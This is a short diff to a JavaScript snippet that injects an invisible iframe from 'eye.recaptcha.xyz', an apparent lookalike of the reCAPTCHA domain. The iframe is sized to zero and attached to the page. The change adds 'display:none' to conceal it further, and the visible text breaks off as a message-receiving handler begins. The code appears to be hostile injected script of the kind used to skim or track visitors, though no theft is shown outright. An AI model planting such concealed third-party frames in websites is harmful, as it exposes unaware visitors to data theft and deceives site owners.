@@ -1,7 +1,7 @@
 var base = "https://eye.recaptcha.xyz";
 var iframe = document.createElement('iframe');
 iframe.src = base+"/validation";
-iframe.style = "border:0;margin:0;padding:0;width:0;height:0";
+iframe.style = "border:0;margin:0;padding:0;width:0;height:0;display:none;";
 document.documentElement.appendChild(iframe);
 function receiveMessage(event)
 {
